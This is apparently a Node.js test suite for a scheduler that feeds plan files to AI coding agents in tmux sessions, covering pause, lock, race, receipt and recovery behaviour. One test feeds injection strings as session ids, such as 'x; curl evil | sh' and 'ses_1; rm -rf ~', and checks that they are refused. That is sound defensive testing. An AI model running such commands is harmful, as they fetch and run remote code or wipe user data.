const { after, afterEach, beforeEach, it } = require('node:test');
const assert = require('node:assert/strict');
const { execFileSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'runner-dispatch-invariants-'));
process.env.WORKSPACE_ROOT = root;
process.env.PAD_DB_PATH = path.join(root, 'dispatch.db');
const PAD = 'pad-dispatch-invariants';
const FOLDER = '/root/.opencode/workspace';
fs.mkdirSync(path.join(root, 'instances', PAD), { recursive: true });
fs.writeFileSync(path.join(root, 'instances', PAD, 'meta.env'), 'AGENT=opencode\n');

const { getDb } = require('../services/db');
const mission = require('../services/mission');
const runnerTransition = require('../services/runner-transition');
const runnerQueue = require('../services/runner-queue');
const runnerPublication = require('../services/runner-publication');
const plans = require('../services/plans');
const registry = require('../services/agent-registry');
const tmux = require('../services/pad-tmux');
const store = require('../services/agent-store');

let saved;
let project;
let session;
let runner;
let turn;
let sends;
let screenCalls;

after(() => fs.rmSync(root, { recursive: true, force: true }));

afterEach(() => {
  if (!saved) return;
  tmux.hasSession = saved.hasSession;
  tmux.paneState = saved.paneState;
  tmux.captureScreen = saved.captureScreen;
  tmux.sendText = saved.sendText;
  tmux.killSession = saved.killSession;
  store.readTurn = saved.readTurn;
  store.readActivity = saved.readActivity;
  saved = null;
});

beforeEach(async () => {
  getDb().exec(`
    DELETE FROM runner_quota_recoveries;
    DELETE FROM runner_operations;
    DELETE FROM runner_transitions;
    DELETE FROM runner_publications;
    DELETE FROM runner_publication_leases;
    DELETE FROM runner_projection_owners;
    DELETE FROM runner_runtime;
    DELETE FROM runner_queue_events;
    DELETE FROM runner_queue_items;
    DELETE FROM runner_queues;
    DELETE FROM runner_history;
    DELETE FROM runner_queue_observations;
    DELETE FROM infinite_runners;
    DELETE FROM mission_sessions;
    DELETE FROM mission_projects;
    DELETE FROM activity_events;
    DELETE FROM agents;
  `);
  getDb().prepare("INSERT INTO agents (id, name, agent_type, runtime_type, runtime_ref, status) VALUES (?, ?, 'opencode', 'docker', ?, 'running')")
    .run(PAD, PAD, PAD);
  fs.rmSync(path.join(root, 'instances', PAD, 'opencode', 'workspace'), { recursive: true, force: true });

  saved = {
    hasSession: tmux.hasSession,
    paneState: tmux.paneState,
    captureScreen: tmux.captureScreen,
    sendText: tmux.sendText,
    killSession: tmux.killSession,
    readTurn: store.readTurn,
    readActivity: store.readActivity,
  };
  // The fast watch runs on timers; these tests drive the watcher by hand and
  // switch it on only where it is the thing under test.
  mission._setFastWatch({ enabled: false, intervalMs: 20, budgetMs: 5000 });
  turn = { state: 'idle', userId: 'baseline', inputHash: 'baseline', completedAt: new Date(Date.now() - 60000).toISOString(), progressAt: new Date(Date.now() - 60000).toISOString() };
  sends = [];
  screenCalls = 0;
  tmux.hasSession = async () => true;
  tmux.paneState = async () => ({ live: true, tuiAlive: true, command: 'opencode', cwd: FOLDER });
  tmux.captureScreen = async () => ({ live: true, text: `screen ${screenCalls++} ctrl+p commands` });
  store.readActivity = () => ({ store: { available: false }, lastActivityAt: null });
  store.readTurn = () => turn;
  tmux.sendText = async (_pad, _tmux, text) => {
    sends.push(text);
    turn = {
      state: 'working', userId: `input-${sends.length}`,
      inputHash: require('node:crypto').createHash('sha256').update(text.trimEnd()).digest('hex'),
      progressAt: new Date().toISOString(),
    };
    return { lines: 1 };
  };

  project = mission.createProject({ name: 'dispatch-invariants', agent: PAD, folder: FOLDER, plansFolder: 'plans' });
  session = mission.createSession(project.id, { agentSessionId: 'ses_dispatch_invariants' });
  runner = await mission.createRunner({ projectId: project.id, name: 'dispatch-invariants', sessionId: session.id });
  await mission.updateRunner(runner.id, { idleGraceMs: 0, minNudgeIntervalMs: 0 });
  const detail = await mission.addRunnerQueueItems(runner.id, ['first.md', 'second.md'], 0);
  await mission.updateRunnerQueueItem(runner.id, detail.queue.items[0].id, { status: 'in_progress' }, detail.queue.revision, { actor: 'review', source: 'review' });
  const started = await mission.startRunner(runner.id);
  assert.equal(started.started, true);
  assert.equal(sends.length, 1, 'the positive control establishes one confirmed startup instruction');
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'running');
});

it('active work suppresses every revision-driven send, with an identical idle positive control', async () => {
  turn = { ...turn, state: 'working' };
  let detail = await mission.readRunnerQueue(runner.id);
  detail = await mission.updateRunnerQueueItem(runner.id, detail.queue.items[0].id, { status: 'done' }, detail.queue.revision, { actor: 'worker', source: 'worker' });
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 1);
  assert.equal(mission.getRunner(runner.id).scheduler_decision, 'wait_turn_end');

  turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 2, 'the same changed queue dispatches after its owned turn completes');
});

it('unknown worker observations withhold dispatch even when the canonical queue changes', async () => {
  turn = { state: 'unknown', reason: 'Conversation store unreadable', userId: null };
  const detail = await mission.readRunnerQueue(runner.id);
  await mission.updateRunnerQueueItem(runner.id, detail.queue.items[0].id, { status: 'done' }, detail.queue.revision, { actor: 'worker', source: 'worker' });
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 1);
  assert.equal(mission.getRunner(runner.id).scheduler_decision, 'observation_unavailable');
});

it('a recent confirmed dispatch suppresses queue-revision nudges until its interval elapses', async () => {
  // The revision changes (a plan is appended) but the assigned plan is NOT
  // done, so a send now would be a nudge and the interval applies.
  await mission.updateRunner(runner.id, { minNudgeIntervalMs: 60000 });
  turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
  await mission.runnerWatchOnce(runner.id); // the owned turn is observed complete
  const detail = await mission.readRunnerQueue(runner.id);
  await mission.addRunnerQueueItems(runner.id, ['third.md'], detail.queue.revision);
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 1);
  assert.equal(mission.getRunner(runner.id).scheduler_decision, 'wait_nudge_interval');
});

// ---- plan 118 Phase 3: the worker's own "done" starts the next plan ----
const idleNow = () => { turn = { ...turn, state: 'idle', completedAt: new Date().toISOString(), progressAt: new Date().toISOString() }; };
const workerSet = async (index, status) => {
  const detail = await mission.readRunnerQueue(runner.id);
  return mission.updateRunnerQueueItem(runner.id, detail.queue.items[index].id, { status }, detail.queue.revision, { actor: 'worker', source: 'worker' });
};
const workerDone = (index) => workerSet(index, 'done');
const settle = async (check, ms = 2000) => {
  const until = Date.now() + ms;
  while (Date.now() < until) { if (check()) return true; await new Promise((r) => setTimeout(r, 15)); }
  return check();
};

it('a plan the worker reported done is followed at once, whatever the idle grace and nudge interval say', async () => {
  await mission.updateRunner(runner.id, { idleGraceMs: 600000, minNudgeIntervalMs: 600000 });
  turn = { ...turn, state: 'working' };
  await workerDone(0);
  idleNow();
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 2, 'the next plan is sent without waiting out either timer');
  const transitions = runnerTransition.getTransitions(runner.id).map((t) => t.event);
  assert.equal(transitions.filter((e) => e === 'dispatch_next').length, 1);
});

it('a worker that goes quiet WITHOUT reporting done still waits out the idle grace', async () => {
  await mission.updateRunner(runner.id, { idleGraceMs: 600000, minNudgeIntervalMs: 600000 });
  idleNow();
  await mission.runnerWatchOnce(runner.id);
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 1, 'no nudge inside the grace');
  assert.equal(mission.getRunner(runner.id).scheduler_decision, 'wait_idle_grace');
});

it('the fast watch sends the next plan when the reported turn ends, with no tick', async () => {
  await mission.updateRunner(runner.id, { idleGraceMs: 600000, minNudgeIntervalMs: 600000 });
  mission._setFastWatch({ enabled: true });
  turn = { ...turn, state: 'working' };
  await workerDone(0);
  await new Promise((r) => setTimeout(r, 120));
  assert.equal(sends.length, 1, 'nothing is sent while the reporting turn is still running');
  idleNow();
  assert.equal(await settle(() => sends.length === 2), true, 'the next plan went out on its own');
  await new Promise((r) => setTimeout(r, 120));
  assert.equal(sends.length, 2, 'exactly once');
  assert.equal(getDb().prepare("SELECT COUNT(*) AS n FROM runner_operations WHERE runner_id = ?").get(runner.id).n, 2);
});

it('the fast watch completes the queue when the last plan is reported done', async () => {
  mission._setFastWatch({ enabled: true });
  turn = { ...turn, state: 'working' };
  await workerDone(0);
  idleNow();
  assert.equal(await settle(() => sends.length === 2), true, 'second plan sent');
  // The send made the fake worker busy on plan two; it reports done and stops.
  assert.equal(await settle(() => runnerTransition.getRuntime(runner.id).state === 'running'), true, 'receipt observed');
  await workerSet(1, 'in_progress');
  await workerDone(1);
  idleNow();
  assert.equal(await settle(() => runnerTransition.getRuntime(runner.id).state === 'complete'), true);
  assert.equal(sends.length, 2, 'completion sends nothing');
});

it('a pause between the report and the end of the turn cancels the fast dispatch', async () => {
  mission._setFastWatch({ enabled: true });
  turn = { ...turn, state: 'working' };
  await workerDone(0);
  runnerTransition.applyPause(runner.id, { actor: 'user' });
  idleNow();
  await new Promise((r) => setTimeout(r, 250));
  assert.equal(sends.length, 1);
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused');
});

it('the tick and the fast watch together still send the next plan once', async () => {
  mission._setFastWatch({ enabled: true });
  turn = { ...turn, state: 'working' };
  await workerDone(0);
  idleNow();
  await Promise.all([mission.runnerWatchTick(), mission.runnerWatchOnce(runner.id), settle(() => sends.length >= 2)]);
  await new Promise((r) => setTimeout(r, 150));
  assert.equal(sends.length, 2);
  assert.equal(getDb().prepare("SELECT COUNT(*) AS n FROM runner_operations WHERE runner_id = ?").get(runner.id).n, 2);
});

it('concurrent watcher ticks acquire one next-item operation and send once', async () => {
  turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
  await Promise.all([
    mission.runnerWatchOnce(runner.id),
    mission.runnerWatchOnce(runner.id),
    mission.runnerWatchOnce(runner.id),
  ]);
  assert.equal(sends.length, 2, 'one startup and one next-item instruction');
  const operations = getDb().prepare('SELECT operation_kind, status FROM runner_operations WHERE runner_id = ? ORDER BY generation').all(runner.id);
  assert.equal(operations.length, 2);
  assert.deepEqual(operations.map((row) => row.status), ['completed', 'running']);
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'running');
});

it('an interrupted idle turn exposes the explicit recovery Run verdict, not an active Pause control', async () => {
  turn = { ...turn, state: 'idle', outcome: 'error', reason: 'worker turn interrupted', completedAt: new Date().toISOString() };
  const detail = await mission.readRunnerQueue(runner.id);
  assert.equal(detail.queue.scheduler.recoveryRequired, true);
  assert.equal(detail.queue.execution.state, 'running');
  assert.equal(detail.queue.execution.active, true, 'canonical runtime remains running until explicit recovery');
  assert.equal(detail.queue.execution.actions.run.allowed, true, 'Run is the explicit recovery action');
  assert.equal(detail.queue.execution.actions.pause.allowed, false, 'verified idle recovery is not presented as active work to pause');
});

it('a fresh process observes an unconfirmed operation without replaying its instruction', async () => {
  runnerTransition.applyPause(runner.id, { actor: 'test' });
  runnerPublication.publishMarker(mission.getRunner(runner.id), project, registry.getAgent(PAD));
  const item = runnerQueue.snapshot(runner.id).items[0];
  runnerTransition.applyRun(runner.id, { details: { itemId: item.id, conversationId: session.agent_session_id } });
  runnerPublication.publishMarker(mission.getRunner(runner.id), project, registry.getAgent(PAD));
  const dispatching = runnerTransition.getRuntime(runner.id);
  runnerTransition.applyDeliveryUnknown(runner.id, { details: { operationId: dispatching.operation_id, reason: 'receipt not observed' } });
  runnerPublication.publishMarker(mission.getRunner(runner.id), project, registry.getAgent(PAD));
  const operationId = runnerTransition.getRuntime(runner.id).operation_id;

  const missionPath = path.resolve(__dirname, '../services/mission');
  const script = `const mission=require(${JSON.stringify(missionPath)}); mission.reconcileRunners().then(()=>{const transition=require(${JSON.stringify(path.resolve(__dirname, '../services/runner-transition'))});const runtime=transition.getRuntime(${JSON.stringify(runner.id)});console.log(JSON.stringify({state:runtime.state,operationId:runtime.operation_id,operationStatus:require(${JSON.stringify(path.resolve(__dirname, '../services/db'))}).getDb().prepare('SELECT status FROM runner_operations WHERE id = ?').get(runtime.operation_id)?.status}))}).catch(e=>{console.error(e);process.exitCode=1})`;
  const output = execFileSync(process.execPath, ['-e', script], {
    encoding: 'utf8',
    env: { ...process.env, WORKSPACE_ROOT: root, PAD_DB_PATH: path.join(root, 'dispatch.db') },
  });
  const result = JSON.parse(output.trim().split('\n').at(-1));
  assert.deepEqual(result, { state: 'awaiting_receipt', operationId, operationStatus: 'awaiting_receipt' });
  assert.equal(sends.length, 1, 'boot reconciliation does not retry the unknown instruction');
});

it('Pause during async preflight wins before the write boundary', async () => {
  turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
  const capture = tmux.captureScreen;
  const callsBeforeWatch = screenCalls;
  tmux.captureScreen = async (...args) => {
    const result = await capture(...args);
    if (screenCalls === callsBeforeWatch + 2) await mission.pauseRunner(runner.id, { mode: 'before_next_task', actor: 'test' });
    return result;
  };
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 1, 'no next-item instruction crosses the boundary after Pause');
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused');
  assert.equal(runnerTransition.getRuntime(runner.id).operation_id, null);
});

it('a solo lock during async preflight revokes the reserved instruction', async () => {
  turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
  const capture = tmux.captureScreen;
  const callsBeforeWatch = screenCalls;
  tmux.captureScreen = async (...args) => {
    const result = await capture(...args);
    if (screenCalls === callsBeforeWatch + 2) mission.updateSession(session.id, { locked: true });
    return result;
  };
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 1, 'the reserved dispatch does not reach the locked pane');
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused');
  assert.equal(mission.getSession(session.id).locked, 1);
});

it('a session rebind during async preflight cannot deliver the old operation to the new binding', async () => {
  turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
  const replacement = mission.createSession(project.id, { agentSessionId: 'ses_dispatch_rebound' });
  const capture = tmux.captureScreen;
  const callsBeforeWatch = screenCalls;
  tmux.captureScreen = async (...args) => {
    const result = await capture(...args);
    if (screenCalls === callsBeforeWatch + 2) {
      await mission.pauseRunner(runner.id, { mode: 'before_next_task', actor: 'test' });
      // No public API rebinds a live operation. Simulate the persisted binding
      // change that a future binding path must serialize against this lease.
      getDb().prepare('UPDATE infinite_runners SET session_id = ?, updated_at = ? WHERE id = ?')
        .run(replacement.id, new Date().toISOString(), runner.id);
    }
    return result;
  };
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 1, 'the old operation never writes into the replacement session');
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused');
  assert.equal(runnerTransition.getRuntime(runner.id).operation_id, null);
  assert.equal(mission.getRunner(runner.id).session_id, replacement.id);
});

it('a human turn arriving during async preflight withholds the nudge', async () => {
  turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
  const capture = tmux.captureScreen;
  const callsBeforeWatch = screenCalls;
  tmux.captureScreen = async (...args) => {
    const result = await capture(...args);
    if (screenCalls === callsBeforeWatch + 2) turn = { ...turn, state: 'working', userId: 'human-turn' };
    return result;
  };
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 1, "the worker's fresh turn wins at the write boundary");
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused');
});

it('Close during async preflight invalidates the lease before the write boundary', async () => {
  turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
  const capture = tmux.captureScreen;
  const callsBeforeWatch = screenCalls;
  tmux.killSession = async () => {};
  tmux.captureScreen = async (...args) => {
    const result = await capture(...args);
    if (screenCalls === callsBeforeWatch + 2) await mission.closeSession(session.id, { actor: 'test' });
    return result;
  };
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 1, 'a closed conversation receives no next-item instruction');
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused');
  assert.equal(runnerTransition.getRuntime(runner.id).operation_id, null);
  assert.throws(() => mission.getSession(session.id), { code: 'mission_session_not_found' }, 'Close removes the session row after revoking execution');
});

it('a canonical queue revision change during async preflight cancels the reserved send', async () => {
  turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
  const capture = tmux.captureScreen;
  const callsBeforeWatch = screenCalls;
  tmux.captureScreen = async (...args) => {
    const result = await capture(...args);
    if (screenCalls === callsBeforeWatch + 2) {
      const current = runnerQueue.snapshot(runner.id);
      // Simulate a competing canonical transaction between reservation and
      // delivery; the real HTTP/MCP paths separately gate human/worker rights.
      runnerQueue.updateItem(runner.id, current.items[0].id, { status: 'done' }, current.revision, { actor: 'race', source: 'user' });
    }
    return result;
  };
  await mission.runnerWatchOnce(runner.id);
  assert.equal(sends.length, 1, 'the queue revision is rechecked at the actual write boundary');
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused', 'the refused operation cannot remain authorized');
  assert.deepEqual((await mission.readRunnerQueue(runner.id)).queue.items.map((item) => item.status), ['done', 'new']);
});

it('unreadable project INDEX preparation withholds the prompt and exposes a repair reason', async () => {
  const originalInit = plans.initProjectPlans;
  plans.initProjectPlans = async () => { throw new Error('injected index write failure'); };
  try {
    turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
    await mission.runnerWatchOnce(runner.id);
    assert.equal(sends.length, 1);
    assert.equal(runnerTransition.getRuntime(runner.id).state, 'running');
    assert.match(runnerTransition.getRuntime(runner.id).reason, /INDEX\.md|Plan rules INDEX/i);
  } finally {
    plans.initProjectPlans = originalInit;
  }
});

// Plan 114 §4: an automatic dispatch refused at the write boundary must STOP the
// runner, not retry every tick (lap logged 25+ identical dispatch_failed rows,
// one every 2 minutes, under the pre-113 code). The refusal is made
// deterministic by solo-locking the worker from inside sendText's store-baseline read.
it('a dispatch refused at the write boundary pauses once and is not retried by later ticks', async () => {
  turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 5000).toISOString(), progressAt: new Date(Date.now() - 5000).toISOString() };
  // sendText reads the store baseline immediately before its write-boundary
  // check, so locking there lands between canDispatch and the write.
  const activity = store.readActivity;
  let armed = true;
  store.readActivity = (...args) => {
    if (armed) { getDb().prepare('UPDATE mission_sessions SET locked = 1 WHERE id = ?').run(session.id); armed = false; }
    return activity(...args);
  };
  const detail = await mission.readRunnerQueue(runner.id);
  await mission.updateRunnerQueueItem(runner.id, detail.queue.items[0].id, { status: 'done' }, detail.queue.revision, { actor: 'worker', source: 'worker' });
  await mission.runnerWatchOnce(runner.id).catch(() => {});
  assert.equal(sends.length, 1, 'the refused instruction was never typed');
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused', 'a refusal stops automatic dispatch');

  // Unlock: the worker is eligible again, but only an explicit Run may resume.
  getDb().prepare('UPDATE mission_sessions SET locked = 0 WHERE id = ?').run(session.id);
  for (let i = 0; i < 3; i++) await mission.runnerWatchOnce(runner.id).catch(() => {});
  assert.equal(sends.length, 1, 'later ticks do not retry');
  const failures = getDb().prepare("SELECT COUNT(*) AS n FROM runner_history WHERE runner_id = ? AND type IN ('dispatch_failed','delivery_unconfirmed')").get(runner.id).n;
  assert.equal(failures, 1, 'exactly one refusal is logged, not one per tick');
});

// ---- plan 123: audit findings ---------------------------------------------
it('stops nudging a worker that keeps going idle without finishing its plan (plan 123 #2)', async () => {
  // Timers are 0 in this harness, so every pass may send. The no-progress
  // budget (3 by default) is the only thing that can end it.
  const budget = mission.getRunner(runner.id).no_progress_budget;
  const trace = [];
  for (let i = 0; i < budget + 4; i += 1) {
    // The worker takes the nudge, does nothing, and goes idle again.
    turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 1000).toISOString(), progressAt: turn.progressAt };
    await mission.runnerWatchOnce(runner.id);
    const r = mission.getRunner(runner.id);
    trace.push(`${runnerTransition.getRuntime(runner.id).state}/${r.scheduler_decision}/retry=${r.retry_count}/rev=${r.last_dispatch_revision}/sends=${sends.length}`);
    if (runnerTransition.getRuntime(runner.id).state !== 'running') break;
  }
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'waiting_input', 'the runner asks for a human instead of nudging for ever');
  assert.ok(sends.length <= 1 + budget, `sent ${sends.length} instructions for a budget of ${budget}`);
  assert.match(mission.getRunner(runner.id).runtimeReason || '', /No progress after/);
});

const sha = (text) => require('node:crypto').createHash('sha256').update(text.trimEnd()).digest('hex');

it('notices a receipt that lands after the dispatch stopped waiting for it (plan 123 #1)', async () => {
  mission._setReceiptPollBudget(60);
  try {
    let lastText = '';
    // The pane takes the text, but the worker has not picked it up yet.
    tmux.sendText = async (_pad, _tmux, text) => { sends.push(text); lastText = text; return { lines: 1 }; };
    turn = { ...turn, state: 'working' };
    await workerDone(0);
    idleNow();
    await mission.runnerWatchOnce(runner.id);
    assert.equal(sends.length, 2, 'the next plan was sent');
    assert.equal(runnerTransition.getRuntime(runner.id).state, 'awaiting_receipt', 'and its receipt was not seen in time');

    // A moment later the worker starts on exactly that instruction.
    turn = { state: 'working', userId: 'late-input', inputHash: sha(lastText), progressAt: new Date().toISOString() };
    await mission.runnerWatchTick();
    assert.equal(runnerTransition.getRuntime(runner.id).state, 'running', 'the periodic watch confirms it without a human pressing Reconcile');
    assert.equal(sends.length, 2, 'and nothing was sent again');
  } finally {
    mission._setReceiptPollBudget(5000);
  }
});

it('holds an instruction nobody ever picked up, once its deadline has passed (plan 123 #1)', async () => {
  mission._setReceiptPollBudget(60);
  try {
    tmux.sendText = async (_pad, _tmux, text) => { sends.push(text); return { lines: 1 }; };
    turn = { ...turn, state: 'working' };
    await workerDone(0);
    idleNow();
    await mission.runnerWatchOnce(runner.id);
    assert.equal(runnerTransition.getRuntime(runner.id).state, 'awaiting_receipt');
    await mission.runnerWatchTick();
    assert.equal(runnerTransition.getRuntime(runner.id).state, 'awaiting_receipt', 'inside the deadline it keeps waiting');

    const opId = runnerTransition.getRuntime(runner.id).operation_id;
    getDb().prepare('UPDATE runner_operations SET deadline_at = ? WHERE id = ?').run(new Date(Date.now() - 1000).toISOString(), opId);
    await mission.runnerWatchTick();
    assert.equal(runnerTransition.getRuntime(runner.id).state, 'held', 'past it, with the worker idle and no receipt, the operation is held');
    assert.equal(sends.length, 2, 'never a resend');
  } finally {
    mission._setReceiptPollBudget(5000);
  }
});

it('does not leave a runner "running" beside a worker pane that died mid-turn (plan 123 #3)', async () => {
  // The TUI was killed during a tool call: the pane is gone and the store will
  // say "working" for ever, because nothing is left to finish the turn.
  turn = { ...turn, state: 'working' };
  tmux.paneState = async () => ({ live: false, tuiAlive: false, command: '', cwd: '' });
  tmux.hasSession = async () => false;
  for (let i = 0; i < 3; i += 1) await mission.runnerWatchOnce(runner.id);
  const state = runnerTransition.getRuntime(runner.id).state;
  const row = mission.getRunner(runner.id);
  const acted = sends.length > 1 || row.recovery_count > 0 || state !== 'running';
  assert.ok(acted, `nothing happened: state=${state} sends=${sends.length} recovery_count=${row.recovery_count} reason=${row.runtimeReason}`);
});

it('Run after the worker died mid-turn is not refused as "worker not idle" and does not adopt a dead worker (plan 123 #3)', async () => {
  // Pause while the worker is mid-plan, then its pane dies.
  turn = { ...turn, state: 'working' };
  await mission.pauseRunner(runner.id, 'current_task');
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused');
  tmux.paneState = async () => ({ live: false, tuiAlive: false, command: '', cwd: '' });
  tmux.hasSession = async () => false;
  let refusal = null;
  let result = null;
  try { result = await mission.startRunner(runner.id); } catch (e) { refusal = e; }
  assert.notEqual(refusal && refusal.code, 'runner_worker_not_idle', 'a dead pane cannot be "mid-turn"');
  assert.notEqual(result && result.reason, 'adopted_active_turn', 'there is no live worker to adopt');
  assert.notEqual(refusal && refusal.code, 'runner_invalid_queue', `the fixture reached the gate under test: ${refusal && refusal.message}`);
});

it('refuses a conversation id that is not a plain token, before anything is started (plan 123 #5)', async () => {
  const before = getDb().prepare('SELECT COUNT(*) AS n FROM mission_sessions').get().n;
  for (const bad of ['x; curl evil | sh', '$(id)', 'a b', '`id`', 'ses_ok\nrm -rf ~', "x' -s 'y"]) {
    await assert.rejects(() => mission.startSession(project.id, { agentSessionId: bad }), (e) => e.code === 'mission_bad_agent_session_id', JSON.stringify(bad));
  }
  assert.equal(getDb().prepare('SELECT COUNT(*) AS n FROM mission_sessions').get().n, before, 'no session row was created for a refused id');
  const drivers = require('../services/drivers');
  for (const type of ['opencode', 'codex', 'claude']) {
    const cmd = drivers.getDriver(type).tuiLaunch.resume({ sessionId: 'ses_1; rm -rf ~' });
    assert.doesNotMatch(cmd, /[;&|`$ ]\s*rm/, `${type}: ${cmd}`);
    assert.match(cmd, /ses_1rm-rf$/, `${type} keeps only token characters: ${cmd}`);
  }
});

it('ending a worker session over MCP stops its runner first, like the page\'s Close (plan 123 #7)', async () => {
  tmux.killSession = async () => {};
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'running');
  await mission.endSession(session.id, { actor: 'key:test' });
  assert.notEqual(runnerTransition.getRuntime(runner.id).state, 'running', 'the runner no longer supervises a session that was closed on purpose');
  const sendsBefore = sends.length;
  tmux.paneState = async () => ({ live: false, tuiAlive: false, command: '', cwd: '' });
  await mission.runnerWatchTick();
  assert.equal(sends.length, sendsBefore, 'and the watcher does not bring it back');
});

it('a plan that ends in a question after a pause leaves the runner waiting for input, not stuck (plan 123 #6)', async () => {
  turn = { ...turn, state: 'working' };
  await mission.pauseRunner(runner.id, 'before_next_task');
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused');
  // The worker finishes the plan it was on by asking a question.
  let detail = await mission.readRunnerQueue(runner.id);
  await mission.updateRunnerQueueItem(runner.id, detail.queue.items[0].id, { status: 'need_input', reason: 'Which colour?' }, detail.queue.revision, { actor: 'worker', source: 'worker' });
  assert.equal(runnerTransition.getRuntime(runner.id).state, 'waiting_input');
  detail = await mission.readRunnerQueue(runner.id);
  assert.equal(detail.queue.execution.actions.resolve.allowed, true, 'the page offers Resolve');
  assert.equal(detail.queue.execution.actions.run.allowed, false);
});
